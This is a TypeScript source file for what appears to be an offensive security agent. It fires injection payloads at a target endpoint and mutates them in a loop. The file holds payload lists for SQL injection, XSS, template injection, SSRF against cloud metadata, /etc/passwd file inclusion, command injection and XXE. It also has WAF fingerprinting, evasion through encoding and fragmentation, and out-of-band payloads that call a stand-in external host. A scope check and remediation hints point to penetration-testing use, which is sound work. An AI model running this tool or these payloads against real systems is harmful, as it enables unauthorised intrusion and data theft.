/**
 * Payload Mutation Loop Agent.
 *
 * Drives an iterative probe → observe → reason → mutate loop against a
 * single target endpoint. The goal is not to carry an exhaustive payload
 * library — it is to reason about response deltas, infer active defenses,
 * and generate targeted mutations until the class is resolved or exhausted.
 *
 * Loop invariants:
 *  - The first request is a clean baseline. All subsequent probes are
 *    compared against it for status/length/latency deltas.
 *  - Every attempted payload is fingerprinted in the operation state; the
 *    loop never re-sends a payload it has already tried.
 *  - WAF and error patterns are classified as signals, not pass/fail.
 *  - If the current mutation strategy is exhausted without resolution,
 *    the loop escalates to a different strategy (encoding → case flip →
 *    fragmentation → vector-class switch).
 *  - All requests are scope-gated.
 */

import {
  assertInScope,
  addVector,
  recordAttempt,
  hasAttempted,
  addFinding,
  findAsset,
  upsertAsset,
  getCurrentOperation,
  logTimeline,
  type VulnClass,
  type VectorOutcome,
  type AttackVector,
} from './state'
import { ttpsForClass } from './mitre'

// ─── Types ──────────────────────────────────────────────────

export interface PayloadLoopOptions {
  target: string
  parameter: string
  /** Where the parameter lives. Default 'query'. */
  location?: 'query' | 'body' | 'header' | 'cookie'
  /** HTTP method. Default GET (or POST when location=body). */
  method?: string
  vulnClass: VulnClass
  /** Maximum probes per strategy. Default 12. */
  maxAttempts?: number
  /** Request timeout (seconds). Default 15. */
  requestTimeoutSec?: number
  /** Optional extra headers (auth, content-type, etc). */
  headers?: Record<string, string>
  /** Optional baseline body template for POST targets. */
  baselineBody?: string
}

export interface PayloadLoopResult {
  vectorId: string
  status: VectorOutcome
  attempts: number
  strategies: string[]
  signals: string[]
  reasoning: string
}

// ─── Public entry point ─────────────────────────────────────

/**
 * Run the mutation loop. Returns when the vector is resolved or every
 * strategy is exhausted for the requested vulnerability class.
 */
export async function runPayloadLoop(opts: PayloadLoopOptions): Promise<PayloadLoopResult> {
  const scopeErr = assertInScope(opts.target)
  if (scopeErr) throw new Error(scopeErr)
  const op = getCurrentOperation()
  if (!op) throw new Error('no active operation')

  const maxAttempts = Math.max(1, Math.min(64, opts.maxAttempts ?? 12))
  const location = opts.location ?? 'query'
  const method = (opts.method ?? (location === 'body' ? 'POST' : 'GET')).toUpperCase()
  const timeoutSec = Math.max(1, Math.min(60, opts.requestTimeoutSec ?? 15))

  // Ensure we have an asset + vector to attach the loop to.
  const asset = ensureAsset(opts.target)
  const vector = createLoopVector(asset.id, opts)

  // Baseline: clean request with a neutral marker in the parameter.
  const baselineValue = 'smolerclaw-baseline'
  const baseline = await sendProbe(opts.target, opts.parameter, baselineValue, {
    method,
    location,
    headers: opts.headers,
    baselineBody: opts.baselineBody,
    timeoutSec,
  })
  logTimeline('payload', 'payload:baseline', `${baseline.status ?? 'err'} ${baseline.latencyMs}ms`)

  const strategies = strategyPlan(opts.vulnClass)
  const attemptedStrategies: string[] = []
  const signals = new Set<string>()
  let attempts = 0
  let finalStatus: VectorOutcome = 'failed'
  let reasoning = 'exhausted all mutation strategies without conclusive result'

  strategyLoop:
  for (const strategy of strategies) {
    attemptedStrategies.push(strategy.id)
    logTimeline('payload', 'payload:strategy', strategy.id)

    for (const candidate of strategy.candidates(opts.vulnClass)) {
      if (attempts >= maxAttempts) break strategyLoop
      if (hasAttempted(vector.id, candidate)) continue

      const probe = await sendProbe(opts.target, opts.parameter, candidate, {
        method,
        location,
        headers: opts.headers,
        baselineBody: opts.baselineBody,
        timeoutSec,
      })
      attempts++

      const detected = classifyResponse(baseline, probe, candidate, opts.vulnClass)
      for (const s of detected.signals) signals.add(s)

      const outcome: VectorOutcome = detected.outcome
      recordAttempt(vector.id, {
        payload: candidate,
        response: {
          status: probe.status,
          latencyMs: probe.latencyMs,
          bodySnippet: probe.body.slice(0, 400),
          headers: probe.headers,
        },
        signals: detected.signals,
        outcome,
        reasoning: detected.reasoning,
      })

      if (outcome === 'succeeded') {
        finalStatus = 'succeeded'
        reasoning = detected.reasoning
        addFinding({
          severity: severityForClass(opts.vulnClass),
          title: `${opts.vulnClass.toUpperCase()} confirmed on ${opts.target}#${opts.parameter}`,
          description: detected.reasoning,
          assetId: asset.id,
          vectorId: vector.id,
          ttps: ttpsForClass(opts.vulnClass),
          evidence: [candidate, ...detected.signals],
          remediation: remediationHint(opts.vulnClass),
        })
        logTimeline('payload', 'payload:confirmed', `${opts.vulnClass} on ${opts.parameter}`)
        break strategyLoop
      }

      if (detected.waf) {
        logTimeline('payload', 'payload:waf', `waf signals: ${detected.signals.join(',')}`)
        // Mutation strategies *should* adapt — moving to the next strategy
        break
      }
    }

    if (attempts >= maxAttempts) break
  }

  return {
    vectorId: vector.id,
    status: finalStatus,
    attempts,
    strategies: attemptedStrategies,
    signals: Array.from(signals),
    reasoning,
  }
}

// ─── Vector bookkeeping ─────────────────────────────────────

function ensureAsset(target: string) {
  const existing = findAsset((a) => a.value === target)
  if (existing) return existing
  return upsertAsset({
    type: 'url',
    value: target,
    discoveredBy: 'payload',
    techStack: [],
    metadata: {},
    confidence: 1,
  })
}

function createLoopVector(assetId: string, opts: PayloadLoopOptions): AttackVector {
  return addVector({
    assetId,
    class: opts.vulnClass,
    description: `payload-loop: ${opts.vulnClass} on ${opts.parameter}@${opts.target}`,
    rationale: 'operator-initiated mutation loop',
    likelihood: 0.5,
    evidence: [],
    ttps: ttpsForClass(opts.vulnClass),
  })
}

// ─── Probe request ──────────────────────────────────────────

interface ProbeResult {
  status?: number
  latencyMs: number
  body: string
  headers: Record<string, string>
  errored?: boolean
}

async function sendProbe(
  targetUrl: string,
  param: string,
  value: string,
  opts: {
    method: string
    location: 'query' | 'body' | 'header' | 'cookie'
    headers?: Record<string, string>
    baselineBody?: string
    timeoutSec: number
  },
): Promise<ProbeResult> {
  let url = targetUrl
  const init: RequestInit = { method: opts.method, redirect: 'manual' }
  const headers: Record<string, string> = {
    'User-Agent': 'smolerclaw-offensive/1.0',
    ...opts.headers,
  }

  if (opts.location === 'query') {
    const u = new URL(targetUrl)
    u.searchParams.set(param, value)
    url = u.toString()
  } else if (opts.location === 'body') {
    if (opts.baselineBody) {
      init.body = opts.baselineBody.replace(new RegExp(`(${escapeRegex(param)}=)[^&]*`), `$1${encodeURIComponent(value)}`)
    } else {
      init.body = `${encodeURIComponent(param)}=${encodeURIComponent(value)}`
    }
    headers['Content-Type'] = headers['Content-Type'] ?? 'application/x-www-form-urlencoded'
  } else if (opts.location === 'header') {
    headers[param] = value
  } else if (opts.location === 'cookie') {
    headers['Cookie'] = `${param}=${value}`
  }

  init.headers = headers

  const controller = new AbortController()
  const timer = setTimeout(() => controller.abort(), opts.timeoutSec * 1000)
  init.signal = controller.signal

  const start = performance.now()
  try {
    const res = await fetch(url, init)
    const body = await res.text()
    const latencyMs = Math.round(performance.now() - start)
    const hdrs: Record<string, string> = {}
    res.headers.forEach((v, k) => { hdrs[k] = v })
    return { status: res.status, latencyMs, body, headers: hdrs }
  } catch (err) {
    const latencyMs = Math.round(performance.now() - start)
    return { latencyMs, body: err instanceof Error ? err.message : String(err), headers: {}, errored: true }
  } finally {
    clearTimeout(timer)
  }
}

function escapeRegex(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
}

// ─── Signal classification ──────────────────────────────────

interface Classification {
  outcome: VectorOutcome
  signals: string[]
  reasoning: string
  waf: boolean
}

/**
 * Compare a probe response to the baseline and draw conclusions. Each
 * signal is named so the caller can decide how to mutate next.
 */
function classifyResponse(
  baseline: ProbeResult,
  probe: ProbeResult,
  payload: string,
  cls: VulnClass,
): Classification {
  const signals: string[] = []
  let waf = false

  // WAF fingerprinting on response headers/body
  const bodyLower = probe.body.toLowerCase()
  const serverHeader = (probe.headers['server'] ?? '').toLowerCase()
  if (probe.status === 403 || probe.status === 406 || probe.status === 419) {
    signals.push(`waf:blocked-status-${probe.status}`)
    waf = true
  }
  if (/cloudflare/.test(serverHeader) || /cf-ray/.test(JSON.stringify(probe.headers).toLowerCase())) {
    signals.push('waf:cloudflare')
    waf = true
  }
  if (/akamai/.test(serverHeader)) { signals.push('waf:akamai'); waf = true }
  if (/sucuri/.test(serverHeader) || /sucuri/.test(bodyLower)) { signals.push('waf:sucuri'); waf = true }
  if (/incapsula/.test(bodyLower)) { signals.push('waf:imperva'); waf = true }
  if (/mod_security/.test(bodyLower) || /modsecurity/.test(bodyLower)) { signals.push('waf:modsecurity'); waf = true }

  // Length/latency deltas
  const lenDelta = probe.body.length - baseline.body.length
  if (Math.abs(lenDelta) > 128) signals.push(`delta:length:${lenDelta}`)
  const latDelta = probe.latencyMs - baseline.latencyMs
  if (Math.abs(latDelta) > 500) signals.push(`delta:latency:${latDelta}ms`)
  if (probe.status !== baseline.status) signals.push(`delta:status:${baseline.status}->${probe.status}`)

  // Reflection check
  const raw = payload
  const reflected = probe.body.includes(raw) || probe.body.includes(encodeURIComponent(raw))
  if (reflected) signals.push('reflected')

  // Per-class error / success detection
  let outcome: VectorOutcome = 'inconclusive'
  let reasoning = 'no strong signal'

  switch (cls) {
    case 'sqli': {
      // Classic verbal errors — high-confidence success
      if (/sql syntax|mysql_fetch|ora-\d{5}|pg_query|sqlite_/.test(bodyLower)) {
        outcome = 'succeeded'
        signals.push('error:sql')
        reasoning = 'SQL error text leaked in response body'
      } else if (latDelta > 4000 && /sleep|benchmark|waitfor|pg_sleep/i.test(payload)) {
        outcome = 'succeeded'
        signals.push('timing:sleep-confirmed')
        reasoning = 'Time-based SQLi confirmed: payload sleep reflected in response latency'
      } else if (reflected && /['"`]/.test(payload)) {
        outcome = 'inconclusive'
        reasoning = 'Payload reflected; no error leak — try boolean/time techniques'
      }
      break
    }
    case 'xss': {
      if (reflected && /<script|onerror=|onload=/.test(bodyLower)) {
        outcome = 'succeeded'
        signals.push('xss:reflected-raw')
        reasoning = 'Payload reflected into HTML context without encoding'
      } else if (reflected) {
        outcome = 'inconclusive'
        reasoning = 'Reflected but encoded; probe with alternative contexts'
      }
      break
    }
    case 'ssti': {
      if (/49|7777|343|1001001/.test(bodyLower) && /\{\{|\$\{|#\{/.test(payload)) {
        outcome = 'succeeded'
        signals.push('ssti:math-evaluated')
        reasoning = 'Server-side template evaluated arithmetic expression in payload'
      }
      break
    }
    case 'ssrf': {
      if (probe.status === 200 && /amazonaws\.com|metadata|169\.254|ec2metadata/.test(bodyLower)) {
        outcome = 'succeeded'
        signals.push('ssrf:metadata-leak')
        reasoning = 'SSRF payload returned cloud metadata content'
      } else if (latDelta > 2000) {
        outcome = 'inconclusive'
        reasoning = 'Latency delta hints at outbound fetch; verify with collaborator'
      }
      break
    }
    case 'lfi': {
      if (/root:[x*]:0:0:|daemon:|bin\/bash/.test(bodyLower)) {
        outcome = 'succeeded'
        signals.push('lfi:etc-passwd')
        reasoning = '/etc/passwd content leaked — local file inclusion confirmed'
      }
      break
    }
    case 'open-redirect': {
      const loc = (probe.headers['location'] ?? '').toLowerCase()
      if (loc && !loc.startsWith('/') && /smolerclaw-evil\.example/.test(loc + payload)) {
        outcome = 'succeeded'
        signals.push('redirect:external')
        reasoning = 'Location header redirected to attacker-controlled origin'
      }
      break
    }
    default:
      if (reflected) reasoning = 'payload reflected, no class-specific signal'
  }

  return { outcome, signals, reasoning, waf }
}

// ─── Mutation strategies ────────────────────────────────────

interface MutationStrategy {
  id: string
  candidates: (cls: VulnClass) => string[]
}

/**
 * Order matters: cheap/obvious probes first, then encoding mutations,
 * then fragmentation, then out-of-band / time-based techniques. The loop
 * moves to the next strategy as soon as the current one produces a WAF
 * block or runs out of candidates.
 */
function strategyPlan(cls: VulnClass): MutationStrategy[] {
  return [
    {
      id: 'direct',
      candidates: (c) => seedPayloads(c),
    },
    {
      id: 'case-flip',
      candidates: (c) => seedPayloads(c).map(caseFlip),
    },
    {
      id: 'url-encode',
      candidates: (c) => seedPayloads(c).map((p) => encodeURIComponent(p)),
    },
    {
      id: 'double-encode',
      candidates: (c) => seedPayloads(c).map((p) => encodeURIComponent(encodeURIComponent(p))),
    },
    {
      id: 'fragmentation',
      candidates: (c) => seedPayloads(c).map((p) => p.replace(/\s+/g, '/**/')),
    },
    {
      id: 'out-of-band',
      candidates: (c) => oobPayloads(c),
    },
  ]
}

/**
 * Short, canonical probes for each class. These are *detection* probes,
 * not destructive exploits — they look for observable side-effects that
 * indicate the class is present.
 */
function seedPayloads(cls: VulnClass): string[] {
  switch (cls) {
    case 'sqli':
      return [
        "'",
        "' OR 1=1 --",
        "1' AND 1=1--",
        "1) AND SLEEP(5)--",
        "1'; WAITFOR DELAY '0:0:5'--",
      ]
    case 'xss':
      return [
        '"><svg/onload=alert(1)>',
        "'\"><img src=x onerror=alert(1)>",
        'javascript:alert(1)',
        '<script>alert(1)</script>',
      ]
    case 'ssti':
      return ['{{7*7}}', '${7*7}', '#{7*7}', '<%= 7*7 %>', '{{7*"7"}}']
    case 'ssrf':
      return [
        'http://169.254.169.254/latest/meta-data/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://[::1]/',
        'http://127.0.0.1:80/',
      ]
    case 'lfi':
      return [
        '../../../../etc/passwd',
        '....//....//....//etc/passwd',
        '/etc/passwd%00',
        'php://filter/convert.base64-encode/resource=index.php',
      ]
    case 'open-redirect':
      return [
        'https://smolerclaw-evil.example/',
        '//smolerclaw-evil.example/',
        '/\\smolerclaw-evil.example/',
      ]
    case 'rce':
      return [
        '$(id)',
        '`id`',
        '; id',
        '| id',
      ]
    case 'xxe':
      return [
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
      ]
    default:
      return ['smolerclaw-probe']
  }
}

function oobPayloads(cls: VulnClass): string[] {
  // Out-of-band / collaborator-style: only useful with an external listener.
  // We still generate them so the operator can correlate hits on their end.
  const marker = `smolerclaw-oob-${Date.now().toString(36)}`
  switch (cls) {
    case 'ssrf':
    case 'xxe':
      return [`http://${marker}.oob.example/`]
    case 'sqli':
      return [
        `'; SELECT load_file('\\\\\\\\${marker}.oob.example\\\\a') --`,
      ]
    default:
      return []
  }
}

function caseFlip(s: string): string {
  let out = ''
  for (const ch of s) {
    out += Math.random() < 0.5 ? ch.toLowerCase() : ch.toUpperCase()
  }
  return out
}

function severityForClass(cls: VulnClass): 'info' | 'low' | 'medium' | 'high' | 'critical' {
  switch (cls) {
    case 'rce':
    case 'sqli':
    case 'xxe':
      return 'critical'
    case 'ssrf':
    case 'ssti':
    case 'lfi':
    case 'authbypass':
      return 'high'
    case 'xss':
    case 'idor':
    case 'open-redirect':
      return 'medium'
    case 'info-disclosure':
    case 'misconfig':
      return 'low'
    default:
      return 'info'
  }
}

function remediationHint(cls: VulnClass): string {
  switch (cls) {
    case 'sqli': return 'Use parameterized queries / prepared statements. Never concatenate user input into SQL.'
    case 'xss': return 'Context-aware output encoding. CSP with nonce. Strict input validation.'
    case 'ssti': return 'Never pass user input to template renderers. Use a logic-less template engine.'
    case 'ssrf': return 'Allow-list outbound hosts. Block link-local/metadata ranges. Disable HTTP redirects in server-side fetches.'
    case 'lfi': return 'Reject path traversal; canonicalize paths; restrict to an allow-listed root.'
    case 'rce': return 'Never pass untrusted input to shell interpreters. Use execFile with a fixed argv.'
    case 'xxe': return 'Disable external entity resolution in the XML parser.'
    case 'idor': return 'Enforce object-level authorization on every read/write.'
    case 'authbypass': return 'Strong auth + MFA; deny-by-default; check on every action.'
    case 'open-redirect': return 'Allow-list redirect destinations to the application origin.'
    default: return 'Apply defense-in-depth and secure coding for the affected class.'
  }
}
